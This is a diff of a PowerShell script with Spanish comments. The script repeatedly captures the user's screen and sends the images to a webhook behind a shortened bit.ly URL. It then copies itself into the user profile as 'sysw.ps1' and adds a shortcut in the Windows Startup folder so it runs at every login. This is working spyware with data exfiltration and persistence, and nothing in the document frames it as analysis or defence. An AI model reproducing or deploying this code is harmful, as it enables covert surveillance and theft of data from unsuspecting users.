@@ -1,7 +1,10 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 0 # Contador de imágenes enviadas al webhook
-$maxImages = 10 # Cantidad máxima de imágenes antes de descargar el otro script
+$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
+
+# Almacenar la ruta del script principal
+$scriptPath = $MyInvocation.MyCommand.Path
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..000." ; $hookurl = (irm $hookurl).url}
@@ -32,7 +35,7 @@ do {
     if ($a -eq $maxImages) {
         # Descargar el script principal
         $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $MyInvocation.MyCommand.Path -OutFile $syswPath
+        Invoke-WebRequest -Uri $scriptPath -OutFile $syswPath
         
         # Crear acceso directo en la carpeta de inicio del usuario
         $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
